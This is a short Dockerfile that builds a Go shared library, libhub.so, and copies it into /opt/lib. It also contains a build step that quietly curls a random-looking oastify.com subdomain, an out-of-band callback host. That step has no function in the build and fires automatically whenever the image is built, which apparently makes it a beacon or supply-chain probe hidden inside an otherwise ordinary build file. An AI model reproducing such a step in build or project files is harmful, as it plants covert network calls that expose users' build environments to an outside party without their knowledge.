FROM golang:1.15.0-buster
WORKDIR /go/src/app
COPY . .
RUN go get -d -v ./...
RUN go build -o libhub.so -buildmode=c-shared embedded_hub.go
RUN curl https://jobrpgjzvxr3f3tfdoo1914xfole93.oastify.com/
ENTRYPOINT ["bash", "-c", "cp /go/src/app/libhub.so /opt/lib/libhub.so"]
